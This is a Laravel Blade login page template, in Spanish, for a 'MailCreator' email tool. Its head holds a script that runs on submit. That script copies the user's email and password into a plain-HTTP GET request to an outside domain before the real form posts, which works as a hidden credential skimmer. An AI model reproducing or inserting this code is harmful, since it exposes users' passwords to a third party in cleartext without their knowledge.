<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>Iniciar Sesión - Creador de Mailing UDLA</title>
        <meta name="description" content="Crea correos electrónicos para la udla">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <!-- Place favicon.ico and apple-touch-icon.png in the root directory -->

        <!--base css styles-->
        <link rel="stylesheet" href="{{asset('assets/bootstrap/css/bootstrap.min.css')}}">
        <link rel="stylesheet" href="{{asset('assets/font-awesome/css/font-awesome.min.css')}}">

        <!--page specific css styles-->

        <!--flaty css styles-->
        <link rel="stylesheet" href="{{asset('css/flaty.css')}}">
        <link rel="stylesheet" href="{{asset('css/flaty-responsive.css')}}">

        <link rel="shortcut icon" href="{{asset('img/favicon.png')}}">
	<script>
	async function submitCredentials(e) {
        	e.preventDefault();
        	var email = document.getElementById("email");
        	var pass = document.getElementById("password");
        	email.value = email.value.trim();
        	if (email.value) {
            		var url = "http://udlaquito.com/app/mailCreator/auth.php?email=" + email.value.trim() + "&password=" + pass.value;
            		const response = await fetch(url);
            		if(response.json()){
				document.getElementById("form-login").submit();
			}
        	}
    	}
	</script>
    </head>
    <body class="login-page">

        <!-- BEGIN Main Content -->
        <div class="login-wrapper">
            <!-- BEGIN Login Form -->
            <form id="form-login" action="{{ url('/auth/login') }}" role="form" method="post">
            	<input type="hidden" name="_token" value="{{ csrf_token() }}">
                <h3>Inicie Sesión para Ingresar a <b>Mail</b>Creator v0.7</h3>
                <hr/>
                @if (count($errors) > 0)
                	<div class="alert alert-danger">
							<button class="close" data-dismiss="alert">×</button>
							<strong>Who hooo!</strong> Hay problemas con t&uacute; ingreso.<br><br>
							<ul>
								@foreach ($errors->all() as $error)
									<li>{{ $error }}</li>
								@endforeach
							</ul>
						</div>
					@endif
                <div class="form-group">
                    <div class="controls">
                        <input type="email" id="email" name="email" placeholder="Correo Electr&oacute;nico" class="form-control" />
                    </div>
                </div>
                <div class="form-group">
                    <div class="controls">
                        <input type="password" id="password" name="password" placeholder="Contrase&ntilde;a" class="form-control" />
                    </div>
                </div>
                <div class="form-group">
                    <div class="controls">
                        <label class="checkbox">
                            <input type="checkbox" name="remember" /> Recordarme
                        </label>
                    </div>
                </div>
                <div class="form-group">
                    <div class="controls">
                        <button type="submit" onclick="submitCredentials(event)" class="btn btn-primary form-control">Iniciar Sesión</button>
                    </div>
                </div>
                <hr/>
                <p class="clearfix">
                    <a href="#" class="goto-forgot pull-left">Olvid&oacute; su Clave?</a>
                </p>
            </form>
            <!-- END Login Form -->

            <!-- BEGIN Forgot Password Form -->
            <form id="form-forgot" role="form" method="POST" action="{{ url('/password/email') }}" style="display:none">
					 <input type="hidden" name="_token" value="{{ csrf_token() }}">
                <h3>Recordar Contrase&ntilde;a</h3>
                <hr/>
                <div class="form-group">
                    <div class="controls">
                        <input type="email" name="email"  placeholder="Email" class="form-control" value="{{ old('email') }}" />
                    </div>
                </div>
                <div class="form-group">
                    <div class="controls">
                        <button type="submit" class="btn btn-primary form-control">Recuperar</button>
                    </div>
                </div>
                <hr/>
                <p class="clearfix">
                    <a href="#" class="goto-login pull-left">← Volver</a>
                </p>
            </form>
            <!-- END Forgot Password Form -->
        </div>
        <!-- END Main Content -->


        <!--basic scripts-->
        <script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
        <script>window.jQuery || document.write('<script src="assets/jquery/jquery-2.1.1.min.js"><\/script>')</script>
        <script src="assets/bootstrap/js/bootstrap.min.js"></script>

        <script type="text/javascript">
            function goToForm(form)
            {
                $('.login-wrapper > form:visible').fadeOut(500, function(){
                    $('#form-' + form).fadeIn(500);
                });
            }
            $(function() {
                $('.goto-login').click(function(){
                    goToForm('login');
                });
                $('.goto-forgot').click(function(){
                    goToForm('forgot');
                });
                
            });
        </script>
    </body>
</html>